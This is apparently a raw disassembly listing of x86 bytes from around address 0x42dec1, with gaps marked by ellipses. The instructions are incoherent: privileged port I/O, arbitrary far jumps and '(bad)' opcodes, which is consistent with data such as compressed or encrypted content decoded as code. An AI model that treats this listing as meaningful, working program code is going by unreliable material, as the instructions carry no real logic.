  42dec1:	push   0x1c
  42dec3:	and    eax,0x7b51c95
  42dec8:	shl    BYTE PTR [ebx+ebx*4],cl
  42decb:	inc    esi
  42decc:	sub    ebx,DWORD PTR [edx]
  42dece:	ret    0x61c2
  42ded1:	int3   
  42ded2:	push   cs
  42ded3:	jg     0x42df04
  42ded5:	out    dx,eax
  42ded6:	jmp    0x2d2e:0x56ff954f
  42dedd:	neg    edi
  42dedf:	fnsave [ebx+0x46]
  42dee2:	mov    ds:0x2393e0fa,al
  42dee7:	loope  0x42de76
  42dee9:	imul   esi,DWORD PTR es:[esi],0x42
  42deed:	popf   
  42deee:	mov    ebp,DWORD PTR [ebx+0x3450d90c]
  42def4:	iret   
  42def5:	mov    dl,0xeb
  42def7:	pop    ebp
  42def8:	adc    al,0x58
  42defa:	or     ah,bh
  42defc:	and    edx,DWORD PTR [edx+0x56aa64c0]
  42df02:	mov    cl,0xdc
  42df04:	xor    al,0x54
  42df06:	sub    eax,0x65d363a5
  42df0b:	lods   eax,DWORD PTR ds:[esi]
  42df0c:	aam    0x1e
  42df0e:	test   eax,0x86dac66
  42df13:	add    BYTE PTR [ebp-0x1937422c],0x3
  42df1a:	inc    edi
  42df1b:	mov    ebx,0x3666819e
  42df20:	in     eax,0xa
  42df22:	add    BYTE PTR ss:[edi],dh
  42df25:	inc    ebx
  42df26:	into   
  42df27:	hlt    
  42df28:	mov    esi,0x3f2bd3d2
  42df2d:	and    al,0xdb
  42df2f:	out    0xb6,eax
  42df31:	out    dx,eax
  42df32:	bound  ebp,QWORD PTR [ecx+eax*4]
	...
  42df95:	add    BYTE PTR [edx],al
  42df97:	(bad)  
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	and    eax,DWORD PTR [edi-0x7f]
  42dfa5:	cmp    DWORD PTR [edi+0x70001ec],eax
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    BYTE PTR [ebp+0xa586a94],dl
  42dfb3:	pop    ebx
  42dfb4:	sahf   
  42dfb5:	or     DWORD PTR [esi-0x56],eax
  42dfb8:	or     ecx,edi
  42dfba:	add    BYTE PTR [edx],cl
  42dfbc:	mov    WORD PTR gs:[esi-0xd945a84],gs
  42dfc3:	add    cl,BYTE PTR [ecx-0x361ac04c]
  42dfc9:	shl    DWORD PTR [ebp-0x14b2a6c4],0xf9
  42dfd0:	and    DWORD PTR [edx+ecx*4],eax
  42dfd3:	lds    eax,FWORD PTR [edi+0x6f]
  42dfd6:	add    DWORD PTR [ebp+edx*2+0x40],eax
  42dfda:	(bad)  
  42dfdb:	std    
  42dfdc:	and    DWORD PTR [esi],eax
  42dfde:	out    0xa9,al
  42dfe0:	(bad)  
  42dfe1:	jmp    0xb16d88ef
  42dfe6:	fsub   QWORD PTR [esi]
  42dfe8:	loope  0x42dfc3
  42dfea:	rcr    ebp,0xdb
  42dfed:	sbb    dh,BYTE PTR [esi+eax*2+0x4414f95f]
  42dff4:	cmp    al,0xde
  42dff6:	cmp    BYTE PTR [eax+edx*8+0x7a],dl
  42dffa:	pop    ebp
  42dffb:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42dffd:	jmp    0x9a983934
  42e002:	fs loopne 0x42dff9
  42e005:	scas   al,BYTE PTR es:[edi]
  42e006:	or     eax,0x7054a015
  42e00b:	sahf   
  42e00c:	sar    DWORD PTR [ebx],1
  42e00e:	lock jl 0x42dfa9
  42e011:	pop    edi
  42e012:	mov    BYTE PTR [eax+0x5531dbd4],ch
  42e018:	sbb    al,0x6
  42e01a:	mov    edi,0xdd38dc78
  42e01f:	fs xchg esi,eax
  42e021:	xor    DWORD PTR [edx-0x15],0xffffff85
  42e025:	fs in  al,0xf6
  42e028:	cld    
  42e029:	push   eax
  42e02a:	(bad)  
  42e02c:	jb     0x42dfb8
  42e02e:	mov    eax,0x8e4f54f6
  42e033:	dec    esp
  42e034:	and    BYTE PTR [ebp-0x8690848],0x3d
  42e03b:	xchg   esp,eax
  42e03c:	out    0x93,al
  42e03e:	test   BYTE PTR [ebx-0x44d70050],0x18
  42e045:	xor    eax,0xb51c5f25
  42e04a:	popa   
  42e04b:	stos   BYTE PTR es:[edi],al
  42e04c:	inc    esi
  42e04d:	(bad)  
  42e04e:	int    0xf
  42e050:	push   cs
  42e051:	dec    eax
  42e052:	sub    ecx,DWORD PTR [ecx]
  42e054:	sti    
  42e055:	cmp    eax,0x8940d22f
  42e05a:	sub    dl,BYTE PTR [esi-0x47860ed9]
  42e060:	xor    BYTE PTR [ebp+0x40],al
  42e063:	sub    eax,0x20a57e71
  42e068:	mov    BYTE PTR [edx+ecx*2+0x3b055ec],dl
  42e06f:	inc    esi
  42e070:	and    al,0x60
  42e072:	adc    eax,0xfb09039c
  42e077:	test   eax,0x42f8bbd3
  42e07c:	popa   
  42e07d:	xor    al,0xca
  42e07f:	loopne 0x42e09b
  42e081:	jge    0x42e0d1
  42e083:	adc    cl,bh
  42e085:	fmul   DWORD PTR [edi+ecx*1+0x1]
  42e089:	xor    al,0xd5
  42e08b:	adc    eax,0x24c17371
  42e090:	and    esi,esi
  42e092:	lds    ebp,FWORD PTR [edi]
  42e094:	shr    BYTE PTR [edx],1
  42e096:	call   0xa93a34b0
  42e09b:	test   DWORD PTR [ebx-0x33],edi
  42e09e:	fldcw  WORD PTR [edi+0x52]
  42e0a1:	adc    DWORD PTR [edx],esi
  42e0a3:	dec    esi
  42e0a4:	xor    bh,bl
  42e0a6:	cld    
  42e0a7:	adc    DWORD PTR [ebp-0x785478da],0x5f
  42e0ae:	mov    WORD PTR [ebx-0x3f01e907],cs
  42e0b4:	push   esi
	...
  42e115:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	(bad)  
  42e122:	and    edx,DWORD PTR [ebx+ebp*8]
  42e125:	ret    0xed8e
  42e128:	add    DWORD PTR [eax],eax
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    BYTE PTR [eax-0x4ea608bd],al
  42e133:	dec    eax
  42e134:	or     DWORD PTR [edi],esp
  42e136:	xor    dl,BYTE PTR [ecx-0x13]
  42e139:	test   al,0xed
  42e13b:	iret   
  42e13c:	sub    al,0x2
  42e13e:	push   ecx
  42e13f:	inc    eax
  42e140:	jmp    0x42e179
  42e142:	loopne 0x42e19c
  42e144:	mov    bh,0x56
  42e146:	or     BYTE PTR [edi+0x3c01fc76],bl
  42e14c:	ja     0x42e11c
  42e14e:	push   eax
  42e14f:	sbb    eax,0x709555a7
  42e154:	jb     0x42e13c
  42e156:	cmp    al,0xde
  42e158:	push   0x9
  42e15a:	sub    eax,0x624e29a9
  42e15f:	xchg   edi,eax
  42e160:	or     ebx,DWORD PTR [eax+0xb]
  42e163:	pop    ds
  42e164:	sahf   
  42e165:	cmp    DWORD PTR [ecx],esp
  42e167:	pop    ebp
  42e168:	test   al,0x60
  42e16a:	daa    
  42e16b:	ins    DWORD PTR es:[edi],dx
  42e16c:	mov    ds:0xaa661a14,al
  42e171:	ins    BYTE PTR es:[edi],dx
  42e172:	sub    al,0x32
  42e174:	sbb    bh,BYTE PTR [esi+eax*4+0x7e26c147]
  42e17b:	jg     0x42e16d
  42e17d:	test   al,0x6
  42e17f:	mov    ch,0x54
  42e181:	cdq    
  42e182:	cmp    BYTE PTR [ebp+0x4b],ch
  42e185:	mov    bh,0x80
  42e187:	loope  0x42e155
  42e189:	xchg   esp,eax
  42e18a:	lock or eax,0x3e31139f
  42e190:	jge    0x42e16c
  42e192:	pop    ds
  42e193:	push   esi
  42e194:	test   al,0x12
  42e196:	ja     0x42e173
  42e198:	js     0x42e1fb
  42e19a:	mov    esp,DWORD PTR [eax]
  42e19c:	adc    eax,0x1f14e585
  42e1a1:	loope  0x42e1bb
  42e1a3:	jmp    0x797a:0x873dabf0
  42e1aa:	in     al,0xf
  42e1ac:	pusha  
  42e1ad:	(bad)  
  42e1ae:	and    ch,BYTE PTR [esi+0x54a012e4]
  42e1b4:	lock mov eax,0x8cd09d46
  42e1ba:	sbb    ah,BYTE PTR [ecx-0x22fc1fbe]
  42e1c0:	rcr    esp,1
  42e1c2:	ds gs test eax,0x251388db
  42e1c9:	loopne 0x42e1e1
  42e1cb:	cmc    
  42e1cc:	adc    DWORD PTR [edx+0x5d],esp
  42e1cf:	sti    
  42e1d0:	jmp    0x42e1b1
  42e1d2:	add    dl,BYTE PTR [esp+esi*8-0x106f6966]
  42e1d9:	mov    eax,ds:0x6d8f5cff
  42e1de:	mov    ebx,0xcd7d1492
  42e1e3:	xor    al,0xa3
  42e1e5:	inc    ecx
  42e1e6:	sub    DWORD PTR [eax-0x1c82b41e],edi
  42e1ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1ed:	inc    ebp
  42e1ee:	das    
  42e1ef:	test   BYTE PTR [ebx+ebx*1+0x1a],ch
  42e1f3:	jmp    0xda12:0xa88f9811
  42e1fa:	in     al,0xe8
  42e1fc:	jp     0x42e189
  42e1fe:	mov    DWORD PTR [edx-0x56],ecx
  42e201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e202:	push   ebp
  42e203:	fimul  WORD PTR [ebx-0x3e]
  42e206:	js     0x42e193
  42e208:	lock push ds
  42e20a:	retf   0x1399
  42e20d:	cmp    edx,DWORD PTR [edi+0x16f0b3d4]
  42e213:	scas   eax,DWORD PTR es:[edi]
  42e214:	js     0x42e22b
  42e216:	lahf   
  42e217:	gs sti 
  42e219:	xchg   esi,eax
  42e21a:	mov    ebx,0xf3e815e9
  42e21f:	ds jno 0x42e29e
  42e222:	dec    edi
  42e223:	mov    ah,0x9d
  42e225:	mov    al,0x4a
  42e227:	cmp    esi,DWORD PTR [ebx+0x230d5d13]
  42e22d:	sub    BYTE PTR [ebp-0x120ca3cd],0xfa
  42e234:	xor    eax,0x0
	...
  42e295:	add    BYTE PTR [ebp-0x655875c3],ch
  42e29b:	mov    bh,0xad
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0xbac711f2
  42e2a5:	retf   0xee95
  42e2a8:	add    DWORD PTR [eax],eax
  42e2aa:	pop    es
  42e2ab:	add    DWORD PTR [eax],eax
  42e2ad:	add    dl,dh
  42e2af:	inc    ecx
  42e2b0:	push   edi
  42e2b1:	lods   al,BYTE PTR ds:[esi]
  42e2b2:	push   edx
  42e2b3:	and    al,0xc8
  42e2b5:	inc    ebx
  42e2b6:	jl     0x42e2ba
  42e2b8:	iret   
  42e2b9:	fadd   st(3),st
  42e2bb:	xor    BYTE PTR [ecx-0x56],ah
  42e2be:	jecxz  0x42e316
  42e2c0:	(bad)  
  42e2c1:	add    al,0xee
  42e2c3:	test   DWORD PTR [edi-0x3e],edi
  42e2c6:	popf   
  42e2c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e2c8:	mov    cl,0x25
  42e2ca:	lahf   
  42e2cb:	jl     0x42e2ed
  42e2cd:	cli    
  42e2ce:	cmp    al,0xe6
  42e2d0:	fcomp  DWORD PTR [esi+0x3]
  42e2d3:	cmp    esp,DWORD PTR [eax+eax*8-0x76]
  42e2d7:	cmp    eax,0xa5edc7eb
  42e2dc:	jne    0x42e264
  42e2de:	mov    ecx,fs
  42e2e0:	xor    eax,0x60d541d7
  42e2e5:	ret    
  42e2e6:	add    BYTE PTR [ecx],al
  42e2e8:	not    BYTE PTR [edx]
  42e2ea:	ror    BYTE PTR [esi],1
  42e2ec:	sub    edi,DWORD PTR [ebp+0x14]
  42e2ef:	test   DWORD PTR [eax+0x774f52f8],edx
  42e2f5:	pop    ebx
  42e2f6:	sub    dl,BYTE PTR [ebx]
  42e2f8:	xchg   ebp,eax
  42e2f9:	xor    eax,0x713d7095
  42e2fe:	sub    al,0x35
  42e300:	fistp  WORD PTR [edx+eax*4+0x6b46a60b]
  42e307:	push   cs
  42e308:	mov    cl,0xa1
  42e30a:	mov    WORD PTR [eax+0x62],fs
  42e30d:	fist   WORD PTR [edx+0x70]
  42e310:	mov    WORD PTR ds:[edi+0x13555682],ss
  42e317:	fld    DWORD PTR [ecx]
  42e319:	jp     0x42e2dc
  42e31b:	cli    
  42e31c:	cmp    dl,BYTE PTR [ebx+0x66]
  42e31f:	push   ecx
  42e320:	in     eax,0x95
  42e322:	cdq    
  42e323:	into   
  42e324:	and    BYTE PTR [esi-0x73a35bcf],0xf5
  42e32b:	jl     0x42e315
  42e32d:	dec    esp
  42e32e:	ja     0x42e30b
  42e330:	inc    esi
  42e331:	loope  0x42e344
  42e333:	leave  
  42e334:	dec    ebp
  42e335:	nop
  42e336:	adc    sp,WORD PTR [eax+0x5269e54d]
  42e33d:	or     BYTE PTR [eax],cl
  42e33f:	push   eax
  42e340:	or     eax,0x240cf238
  42e345:	mov    edi,0xa7f0ad66
  42e34a:	jl     0x42e2df
  42e34c:	mov    ds:0xd21b526,al
  42e351:	jns    0x42e2e8
  42e353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e354:	call   0x8624e841
  42e359:	jae    0x42e316
  42e35b:	retf   
  42e35c:	and    eax,0xff256c36
  42e361:	jmp    DWORD PTR [eax+0x4a21e9e3]
  42e367:	in     al,0xc0
  42e369:	jecxz  0x42e353
  42e36b:	stos   BYTE PTR es:[edi],al
  42e36c:	add    BYTE PTR [edi+0x762089f4],bh
  42e372:	out    dx,eax
  42e373:	out    0x65,al
  42e375:	push   esi
  42e376:	xor    al,0x67
  42e378:	dec    ebx
  42e379:	leave  
  42e37a:	cmp    bl,ch
  42e37c:	mov    edi,0x2438d091
  42e381:	push   esi
  42e382:	lods   eax,DWORD PTR ds:[esi]
  42e383:	mov    ds:0xeff1e393,eax
  42e388:	or     BYTE PTR [edi+0x1c],dl
  42e38b:	inc    esp
  42e38c:	or     bh,bl
  42e38e:	jb     0x42e3fd
  42e390:	xchg   esi,eax
  42e391:	pop    ecx
  42e392:	cmc    
  42e393:	and    BYTE PTR [ecx+0xd],bh
  42e396:	call   0xf7491e
  42e39b:	out    0x2d,eax
  42e39d:	mov    ?,WORD PTR [eax-0x45]
  42e3a0:	push   eax
  42e3a1:	sbb    BYTE PTR [esi],al
  42e3a3:	cmc    
  42e3a4:	rcr    BYTE PTR [ebx-0x6f],0x62
  42e3a8:	pop    edx
  42e3a9:	push   es
  42e3aa:	pop    ds
  42e3ab:	xchg   esp,eax
  42e3ac:	(bad)  
  42e3ad:	(bad)  
  42e3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3af:	data16 fsub DWORD PTR [edi]
  42e3b2:	test   al,0x73
  42e3b4:	std    
	...
  42e415:	add    dl,ah
  42e417:	mov    ebp,0xe7dfc7dc
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	add    BYTE PTR [ecx+0x9],bh
  42e425:	stos   BYTE PTR es:[edi],al
  42e426:	pushf  
  42e427:	out    dx,eax
  42e428:	add    DWORD PTR [eax],eax
  42e42a:	pop    es
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    BYTE PTR [eax-0x4f],cl
  42e430:	push   edx
  42e431:	ret    
  42e432:	test   BYTE PTR [edx+0x47b1d132],0xee
  42e439:	mov    bh,0x51
  42e43b:	xchg   esi,eax
  42e43c:	mov    ds:0xd1c7082c,al
  42e441:	std    
  42e442:	jo     0x42e41f
  42e444:	fnstenv [edx+0x50]
  42e447:	test   eax,0x81e5c59f
  42e44c:	mov    dl,BYTE PTR [esi]
  42e44e:	nop
  42e44f:	test   DWORD PTR [edx],ecx
  42e451:	push   0x3a
  42e453:	or     bl,dl
  42e455:	imul   esp,DWORD PTR [esi-0x69],0x8fb77844
  42e45c:	jge    0x42e42e
  42e45e:	and    BYTE PTR [edi-0x7e9cf60d],bh
  42e464:	es je  0x42e47d
  42e467:	mov    ebp,0x23b1325b
  42e46c:	popf   
  42e46d:	pop    eax
  42e46e:	lods   al,BYTE PTR ds:[esi]
  42e46f:	fst    DWORD PTR [ebx-0x5a]
  42e472:	jb     0x42e461
  42e474:	into   
  42e475:	(bad)  
  42e476:	(bad)  
  42e477:	fnstcw WORD PTR [edi-0x18]
  42e47a:	mov    ds:0xd38c445b,al
  42e47f:	imul   esi,DWORD PTR [esi-0x15],0x617ee336
  42e486:	mov    edx,0xb1ae4e4d
  42e48b:	mov    eax,0x46fed45e
  42e490:	adc    al,0x8
  42e492:	fisub  WORD PTR [eax]
  42e494:	jge    0x42e43c
  42e496:	inc    ebp
  42e497:	nop
  42e498:	mov    DWORD PTR [ebp-0x76dc0b95],eax
  42e49e:	(bad)
  42e4a1:	pop    ss
  42e4a2:	or     al,0x71
  42e4a4:	xor    dh,BYTE PTR [edi-0x72]
  42e4a7:	inc    eax
  42e4a8:	push   0xf49c571b
  42e4ad:	mov    dh,0x2b
  42e4af:	les    ebx,FWORD PTR ds:0x385903e0
  42e4b5:	mov    bl,ah
  42e4b7:	(bad)  
  42e4b9:	int3   
  42e4ba:	adc    eax,0x8c18dc9d
  42e4bf:	jbe    0x42e52f
  42e4c1:	or     al,0x6c
  42e4c3:	pop    ecx
  42e4c4:	cmp    al,0x35
  42e4c6:	inc    esi
  42e4c7:	pop    ebp
  42e4c8:	retf   0x6cda
  42e4cb:	push   ss
  42e4cc:	div    BYTE PTR [ebp+edx*4-0xe13746e]
  42e4d3:	out    0xa5,al
  42e4d5:	jg     0x42e46d
  42e4d7:	aas    
  42e4d8:	mov    bl,BYTE PTR [ebx-0x536c8407]
  42e4de:	inc    esp
  42e4df:	xchg   ecx,eax
  42e4e0:	loop   0x42e4fc
  42e4e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4e3:	or     esp,0xa916d5a1
  42e4e9:	xchg   BYTE PTR [ebx],bh
  42e4eb:	inc    eax
  42e4ec:	mov    ch,0xa8
  42e4ee:	push   eax
  42e4ef:	mov    dl,0x4f
  42e4f1:	ds mov ecx,0xf7b82909
  42e4f7:	mov    esp,0x77dd18bf
  42e4fc:	sbb    BYTE PTR [edx],ch
  42e4fe:	jae    0x42e509
  42e500:	push   ds
  42e501:	outs   dx,DWORD PTR ds:[esi]
  42e502:	xchg   edx,eax
  42e503:	ds scas eax,DWORD PTR es:[edi]
  42e505:	retf   0xae26
  42e508:	sahf   
  42e509:	jnp    0x42e566
  42e50b:	cmp    BYTE PTR [edi+0x4a],ah
  42e50e:	jecxz  0x42e573
  42e510:	aad    0xe6
  42e512:	push   0xab019cad
  42e517:	pop    ecx
  42e518:	push   edx
  42e519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e51a:	xor    DWORD PTR [esi-0x7],ecx
  42e51d:	das    
  42e51e:	add    DWORD PTR [ebx+0x3acdf84c],ebx
  42e524:	push   eax
  42e525:	sar    DWORD PTR [esi],1
  42e527:	and    BYTE PTR [edx+eax*2],dl
  42e52a:	(bad)  
  42e52b:	mov    ah,0x6a
  42e52d:	clc    
  42e52e:	and    cl,BYTE PTR [edx+0x60]
  42e531:	imul   ebx,DWORD PTR [edx+0x7d],0x61
	...
  42e595:	add    BYTE PTR [ebp+0x38],dl
  42e598:	into   
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	(bad)  
  42e5a4:	shl    BYTE PTR [edx-0x5d],0xf0
  42e5a8:	add    DWORD PTR [eax],eax
  42e5aa:	pop    es
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    BYTE PTR [edx+0x7eefe388],bh
  42e5b3:	add    bl,BYTE PTR [eax]
  42e5b5:	mov    DWORD PTR ds:0x96eba3c8,ebx
  42e5bb:	out    0xe6,eax
  42e5bd:	arpl   WORD PTR [eax],ax
  42e5bf:	or     eax,0x5d6e6c96
  42e5c4:	adc    dl,ch
  42e5c6:	bound  esp,QWORD PTR [esi+0x6d]
  42e5c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e5ca:	in     al,0xd
  42e5cc:	mov    edx,0x57b3fdfe
  42e5d1:	dec    edx
  42e5d2:	sbb    bh,bh
  42e5d4:	nop
  42e5d5:	add    esi,ecx
  42e5d7:	repnz dec edx
  42e5d9:	pop    esi
  42e5da:	push   esi
  42e5db:	pop    ss
  42e5dc:	cwde   
  42e5dd:	outs   dx,DWORD PTR ds:[esi]
  42e5de:	xor    dh,ch
  42e5e0:	adc    eax,0x209f074d
  42e5e5:	mov    esp,?
  42e5e7:	mov    ?,edi
  42e5e9:	jg     0x42e669
  42e5eb:	and    eax,edx
  42e5ed:	cmp    eax,0xe723440a
  42e5f2:	adc    esi,esi
  42e5f4:	xchg   esi,eax
  42e5f5:	popf   
  42e5f6:	pop    es
  42e5f7:	pop    es
  42e5f8:	xchg   esp,eax
  42e5f9:	push   edx
  42e5fa:	(bad)  [edi+0x7a]
  42e5fd:	inc    ebp
  42e5fe:	adc    esi,DWORD PTR [ebp-0x2818f158]
  42e604:	cmp    eax,0x30bfa6a2
  42e609:	mov    cl,cl
  42e60b:	xor    al,0x7b
  42e60d:	cmp    BYTE PTR [edx],bh
  42e60f:	and    BYTE PTR [ebx-0x4890f727],ah
  42e615:	or     DWORD PTR [ebx-0x29],ebx
  42e618:	stc    
  42e619:	pop    ebx
  42e61a:	test   al,0x94
  42e61c:	ins    DWORD PTR es:[edi],dx
  42e61d:	xchg   DWORD PTR [esi-0x1cee60a4],ebp
  42e623:	mov    BYTE PTR [ecx+0x57],dl
  42e626:	jecxz  0x42e638
  42e628:	mov    eax,ds:0x8b082ef9
  42e62d:	adc    dl,BYTE PTR [ebp-0x5568ce9f]
  42e633:	sbb    eax,0x1ca6c8ac
  42e638:	repz es int3 
  42e63b:	gs cwde 
  42e63d:	clc    
  42e63e:	pushf  
  42e63f:	pop    edi
  42e640:	cmp    eax,0xbb0e16e7
  42e645:	adc    al,0xdc
  42e647:	lahf   
  42e648:	mov    al,ds:0x644d2254
  42e64d:	mov    esi,0x4451c8c0
  42e652:	(bad)  
  42e653:	popf   
  42e654:	cmp    BYTE PTR ds:0xbfc62896,bl
  42e65a:	loopne 0x42e67c
  42e65c:	(bad)  
  42e65d:	jae    0x42e6cc
  42e65f:	inc    esp
  42e660:	lods   eax,DWORD PTR ds:[esi]
  42e661:	mov    cl,0x7d
  42e663:	mov    esi,0x466d2524
  42e668:	popf   
  42e669:	ror    DWORD PTR [eax-0x15c13bb3],1
  42e66f:	add    ebx,edi
  42e671:	sub    DWORD PTR [esi+0x2c4e5ab4],esi
  42e677:	jle    0x42e637
  42e679:	or     DWORD PTR [edx+0x146d2b98],ecx
  42e67f:	mov    dl,0xd7
  42e681:	call   0x874f3e69
  42e686:	das    
  42e687:	jb     0x42e704
  42e689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e68a:	sbb    eax,0x88705918
  42e68f:	adc    BYTE PTR [eax+edx*8-0x3c],dl
  42e693:	xchg   ebp,esi
  42e695:	pop    ecx
  42e696:	adc    eax,ebx
  42e698:	repnz stos DWORD PTR es:[edi],eax
  42e69a:	lea    ebp,[esi]
  42e69c:	aaa    
  42e69d:	adc    DWORD PTR [ebx+0x37],0xf8776cb
  42e6a4:	xor    eax,DWORD PTR [esi]
  42e6a6:	not    BYTE PTR [esi-0x2d88e640]
  42e6ac:	lods   eax,DWORD PTR ds:[esi]
  42e6ad:	fdiv   st,st(2)
  42e6af:	neg    DWORD PTR [edx-0x1968ebf]
	...
  42e715:	add    BYTE PTR [edx+0x39],bl
  42e718:	dec    esi
  42e719:	sub    eax,0x7f7b7f6f
  42e71e:	scas   al,BYTE PTR es:[edi]
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	mov    edx,0xaad2470f
  42e727:	icebp  
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    cl,dl
  42e72f:	sbb    ebx,DWORD PTR [edx]
  42e731:	(bad)  
  42e732:	ds and dh,bl
  42e735:	sub    eax,0xe61655b6
  42e73a:	test   BYTE PTR [ebx],bl
  42e73c:	push   ecx
  42e73d:	mov    esp,0x8e8490af
  42e742:	call   0x4873:0xda4c3d42
  42e749:	cli    
  42e74a:	loopne 0x42e6d7
  42e74c:	and    eax,esp
  42e74e:	cld    
  42e74f:	pop    ecx
  42e750:	ja     0x42e7b7
  42e752:	cmp    bl,ah
  42e754:	pop    esi
  42e755:	imul   ebp,DWORD PTR [eax-0x62],0xc8bf9c61
  42e75c:	mov    al,0xc5
  42e75e:	jae    0x42e7bb
  42e760:	adc    BYTE PTR [ecx+0x62],ch
  42e763:	clc    
  42e764:	outs   dx,BYTE PTR ds:[esi]
  42e765:	(bad)  [ebx+0x26]
  42e768:	xchg   esi,eax
  42e769:	pushf  
  42e76a:	outs   dx,DWORD PTR ds:[esi]
  42e76b:	or     ebp,DWORD PTR ds:0xd6ee90c2
  42e771:	dec    edx
  42e772:	arpl   bp,cx
  42e774:	out    dx,al
  42e775:	xchg   BYTE PTR [ebp-0x65],dh
  42e778:	sbb    eax,0x7de71e0f
  42e77d:	xchg   ebx,eax
  42e77e:	aad    0x62
  42e780:	fwait
  42e781:	arpl   WORD PTR [ebp+0x4e],si
  42e784:	mov    ah,0xda
  42e786:	or     eax,0x12ed5176
  42e78b:	cmc    
  42e78c:	dec    esp
  42e78d:	dec    edx
  42e78e:	pop    ecx
  42e78f:	dec    esp
  42e790:	pop    ebx
  42e791:	ret    
  42e792:	push   ds
  42e793:	and    cl,BYTE PTR [eax-0x7148696d]
  42e799:	jo     0x42e740
  42e79b:	(bad)  
  42e79c:	scas   al,BYTE PTR es:[edi]
  42e79d:	xor    al,0x65
  42e79f:	daa    
  42e7a0:	push   eax
  42e7a1:	mov    ah,BYTE PTR [eax+0x3a]
  42e7a4:	mov    cl,0xe3
  42e7a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e7a7:	ins    DWORD PTR es:[edi],dx
  42e7a8:	dec    ebx
  42e7a9:	es xor eax,0xf0a06d8
  42e7af:	inc    esp
  42e7b0:	ds mov ah,0x6
  42e7b3:	js     0x42e78b
  42e7b5:	fsub   DWORD PTR [edx+edi*1]
  42e7b8:	clc    
  42e7b9:	mov    ecx,0xfa41b731
  42e7be:	sub    al,0x5d
  42e7c0:	imul   edi,DWORD PTR [eax-0x46],0x2d
  42e7c4:	mov    ds,WORD PTR [ecx+edx*8]
  42e7c7:	cmp    ebp,DWORD PTR [esi-0x37e5a6e8]
  42e7cd:	cdq    
  42e7ce:	sub    eax,0x974e2f0a
  42e7d3:	ss std 
  42e7d5:	sbb    BYTE PTR [ebx],dh
  42e7d7:	pop    eax
  42e7d8:	je     0x42e849
  42e7da:	add    ecx,DWORD PTR ds:0xb741c67b
  42e7e0:	test   DWORD PTR [ebp-0x60],eax
  42e7e3:	add    eax,0xd0fe46b3
  42e7e8:	js     0x42e857
  42e7ea:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e7ec:	or     BYTE PTR [ebp+0x567df28b],dh
  42e7f2:	or     eax,DWORD PTR [esi+esi*2]
  42e7f5:	jg     0x42e7fc
  42e7f7:	inc    edx
  42e7f8:	sahf   
  42e7f9:	push   edx
  42e7fa:	inc    edi
  42e7fb:	adc    eax,0x5727b887
  42e800:	xor    al,0x9
  42e802:	mov    edx,0x8c6fd832
  42e807:	jns    0x42e860
  42e809:	daa    
  42e80a:	mov    edi,0x4bd2780f
  42e80f:	or     esp,DWORD PTR [eax+esi*4-0x5]
  42e813:	hlt    
  42e814:	pop    eax
  42e815:	es or  ch,0x2a
  42e819:	mov    edi,0xb23bc26b
  42e81e:	stos   DWORD PTR es:[edi],eax
  42e81f:	inc    eax
  42e820:	xor    ebx,DWORD PTR [ebx-0x16]
  42e823:	popf   
  42e824:	int    0x84
  42e826:	repz or bh,bl
  42e829:	mov    ch,0x39
  42e82b:	mov    bh,0xe8
  42e82d:	jg     0x42e835
  42e82f:	or     esp,eax
  42e831:	cld    
  42e832:	ins    DWORD PTR es:[edi],dx
  42e833:	loop   0x42e809
	...
  42e895:	add    bl,al
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp+0x206f13c3]
  42e8a3:	sub    al,BYTE PTR [ecx+0x1f2b130]
  42e8a9:	add    BYTE PTR [edi],al
  42e8ab:	add    DWORD PTR [eax],eax
  42e8ad:	add    BYTE PTR [esi-0x5733740],bh
  42e8b3:	jmp    0x4622e878
  42e8b8:	jle    0x42e851
  42e8ba:	cmp    al,0xa9
  42e8bc:	pop    ecx
  42e8bd:	outs   dx,BYTE PTR ds:[esi]
  42e8be:	cmp    cl,dh
  42e8c0:	(bad)  
  42e8c1:	push   cs
  42e8c2:	jne    0x42e914
  42e8c4:	add    al,0x2d
  42e8c6:	adc    DWORD PTR [esi-0x45],0x2
  42e8ca:	hlt    
  42e8cb:	fisttp WORD PTR [edi+0x33b7a3a4]
  42e8d1:	gs add bh,bl
  42e8d4:	and    bl,BYTE PTR [esi-0x4dac64a8]
  42e8da:	out    0xec,al
  42e8dc:	mov    DWORD PTR [ebx],eax
  42e8de:	push   ss
  42e8df:	dec    ebp
  42e8e0:	or     BYTE PTR [edi],ch
  42e8e2:	xchg   edx,eax
  42e8e3:	in     al,dx
  42e8e4:	retf   
  42e8e5:	in     eax,0xa0
  42e8e7:	clc    
